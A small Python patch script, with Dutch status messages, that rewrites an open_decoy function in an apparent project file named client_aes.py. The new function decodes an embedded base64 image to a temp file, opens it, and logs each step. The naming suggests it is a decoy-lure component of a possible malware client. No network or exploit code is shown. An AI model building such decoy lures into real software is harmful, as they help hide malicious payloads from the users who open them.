import re

path = r"C:\Users\rub\shadowlink\fase5\client_aes.py"
src = open(path, encoding="utf-8").read()

new_lines = [
    "def open_decoy():",
    "    log_path = os.path.join(os.environ.get('USERPROFILE', 'C:/Users/rub'), 'Desktop', 'decoy_log.txt')",
    "    log = open(log_path, 'w')",
    "    try:",
    "        log.write('stap1: start' + chr(10))",
    "        p = tempfile.mktemp(suffix='.avif')",
    "        log.write('stap2: p=' + p + chr(10))",
    "        data = base64.b64decode(_DECOY_B64)",
    "        log.write('stap3: decoded ' + str(len(data)) + ' bytes' + chr(10))",
    "        with open(p, 'wb') as f:",
    "            f.write(data)",
    "        log.write('stap4: bestand geschreven' + chr(10))",
    "        os.startfile(p)",
    "        log.write('stap5: startfile gedaan' + chr(10))",
    "    except Exception as e:",
    "        log.write('FOUT: ' + str(e) + chr(10))",
    "    finally:",
    "        log.close()",
    "",
]

new_func = "\n".join(new_lines)
new_src = re.sub(r"def open_decoy\(\):.*?(?=\ndef |\Z)", new_func, src, flags=re.DOTALL)
if new_src == src:
    print("FOUT: open_decoy niet gevonden")
else:
    open(path, "w", encoding="utf-8").write(new_src)
    print("Klaar")
